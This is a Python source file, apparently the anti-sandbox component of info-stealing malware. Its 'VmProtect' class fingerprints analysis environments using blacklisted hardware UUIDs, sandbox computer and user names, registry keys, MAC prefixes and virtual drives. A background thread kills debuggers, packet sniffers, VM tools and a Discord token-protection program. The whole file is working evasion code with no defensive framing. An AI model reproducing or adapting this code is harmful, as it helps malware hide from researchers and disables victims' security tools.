import psutil
import os
import subprocess
from threading import Thread
import uuid
import re

isvm = False

class VmProtect:

    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = (
        'fakenet',
        'dumpcap',
        'httpdebuggerui',
        'wireshark',
        'fiddler',
        'vboxservice',
        'df5serv',
        'vboxtray',
        'vmtoolsd',
        'vmwaretray',
        'ida64',
        'ollydbg',
        'pestudio',
        'vmwareuser',
        'vgauthservice',
        'vmacthlp',
        'x96dbg',
        'x32dbg',
        'prl_cc',
        'prl_tools',
        'xenservice',
        'qemu-ga',
        'joeboxcontrol',
        'ksdumperclient',
        'ksdumper',
        'joeboxserver',
        'vmwareservice',
        'discordtokenprotector',
        'vmsrvc',
        'vmusrvc',
    )

    @staticmethod
    def checkUUID() -> bool:
        try:
            uuid_val = subprocess.run(
                "wmic csproduct get uuid", shell=True, capture_output=True
            ).stdout.splitlines()[2].decode(errors='ignore').strip()
            return uuid_val in VmProtect.BLACKLISTED_UUIDS
        except Exception:
            return False

    @staticmethod
    def checkComputerName() -> bool:
        try:
            computername = os.getenv("computername")
            return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES
        except Exception:
            return False

    @staticmethod
    def checkUsers() -> bool:
        try:
            user = os.getlogin()
            return user.lower() in VmProtect.BLACKLISTED_USERS
        except Exception:
            return False

    @staticmethod
    def checkRegistry() -> bool:
        try:
            r1 = subprocess.run(
                "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2",
                capture_output=True, shell=True
            )
            r2 = subprocess.run(
                "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2",
                capture_output=True, shell=True
            )
            gpucheck = any(
                x.lower() in subprocess.run(
                    "wmic path win32_VideoController get name", capture_output=True, shell=True
                ).stdout.decode(errors="ignore").splitlines()[2].strip().lower()
                for x in ("virtualbox", "vmware")
            )
            dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
            return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
        except Exception:
            return False

    @staticmethod
    def checkProcessesAndFiles() -> bool:
        try:
            vm_files = [
                "C:\\windows\\system32\\vmGuestLib.dll",
                "C:\\windows\\system32\\vm3dgl.dll",
                "C:\\windows\\system32\\vboxhook.dll",
            ]

            tokens = set(VmProtect.BLACKLISTED_TASKS)
            tokens.update(name + '.exe' for name in VmProtect.BLACKLISTED_TASKS)

            for process in psutil.process_iter(['name']):
                name = (process.info.get('name') or '').lower()
                base = name[:-4] if name.endswith('.exe') else name
                if name in tokens or base in tokens:
                    return True

            for file_path in vm_files:
                if os.path.exists(file_path):
                    return True

            return False
        except Exception:
            return False

    @staticmethod
    def checkMAC() -> bool:
        try:
            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            vm_mac_prefixes = {
                "00:05:69",  # VMware
                "00:0C:29",  # VMware
                "00:1C:14",  # VMware
                "00:50:56",  # VMware
                "08:00:27",  # VirtualBox
                "0A:00:27",  # VirtualBox
            }
            return any(mac.upper().startswith(prefix.replace(":", "").upper()) for prefix in vm_mac_prefixes)
        except Exception:
            return False

    @staticmethod
    def checkDrives() -> bool:
        try:
            vm_drives = ("VBOX_HARDDISK", "VMware Virtual disk", "Virtual HD")
            for disk in psutil.disk_partitions():
                if any(name.lower() in disk.device.lower() for name in vm_drives):
                    return True
            return False
        except Exception:
            return False

    @staticmethod
    def killTasks() -> None:
        for proc in psutil.process_iter(['name']):
            try:
                name = (proc.info.get('name') or '').lower()
                if name in VmProtect.BLACKLISTED_TASKS or name[:-4] in VmProtect.BLACKLISTED_TASKS:
                    proc.kill()
            except Exception:
                continue

    @staticmethod
    def isVM() -> bool:
        Thread(target=VmProtect.killTasks, daemon=True).start()
        global isvm

        # Single huge check, short-circuits on first True
        for check in [
            VmProtect.checkUUID,
            VmProtect.checkComputerName,
            VmProtect.checkUsers,
            VmProtect.checkRegistry,
            VmProtect.checkProcessesAndFiles,
            VmProtect.checkMAC,
            VmProtect.checkDrives
        ]:
            if check():
                isvm = True
                return True

        isvm = False
        return False


if __name__ == "__main__":
    result = VmProtect.isVM()